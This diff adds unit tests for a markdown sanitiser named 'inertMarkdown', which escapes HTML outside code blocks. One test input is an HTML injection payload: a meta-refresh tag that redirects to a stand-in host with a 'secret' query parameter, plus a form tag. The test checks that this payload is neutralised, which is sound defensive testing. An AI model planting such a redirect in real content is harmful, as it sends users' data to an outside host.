@@ -3,6 +3,7 @@ import {
   emptyTree,
   entryDescription,
   entryLabel,
+  inertMarkdown,
   inputsDiffer,
   newInput,
   parseTree,
@@ -89,5 +90,19 @@ describe('inputs', () => {
   it('knows which triggers run on a message', () => {
     expect(triggerTakesMessage(catalogFixture, 'mail.arrived')).toBe(true)
     expect(triggerTakesMessage(catalogFixture, 'app.start')).toBe(false)
+  })
+})
+
+describe('inertMarkdown', () => {
+  it('turns html outside code into text', () => {
+    const md = '<meta http-equiv="refresh" content="0;url=https://x.example/?d=secret">\n**hi** <form action=x><b>'
+    const out = inertMarkdown(md)
+    expect(out).not.toMatch(/<[a-z]/i)
+    expect(out).toContain('**hi**')
+  })
+
+  it('leaves code alone', () => {
+    const md = 'use `a < b` here\n```\nif a < b then\n```\n<b>'
+    expect(inertMarkdown(md)).toBe('use `a < b` here\n```\nif a < b then\n```\n&lt;b>')
   })
 })
